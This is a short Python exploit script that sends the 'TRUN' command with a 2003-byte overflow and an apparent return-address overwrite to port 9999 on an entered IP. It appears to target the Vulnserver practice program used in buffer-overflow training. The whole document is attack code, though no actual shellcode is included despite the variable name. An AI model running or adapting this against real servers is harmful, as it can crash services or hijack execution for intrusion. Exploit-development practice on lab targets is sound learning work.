#!/usr/bin/python3

import socket
import sys

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"

try:
    ip_address = input("Enter the server IP address: ")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((ip_address, 9999))
    s.send(b'TRUN /.:/' + shellcode)
    print("Fuzzing with TRUN command with %s bytes" % len(shellcode))
    s.close()
except Exception as e:
    print("Error connecting to server:", e)
    sys.exit()
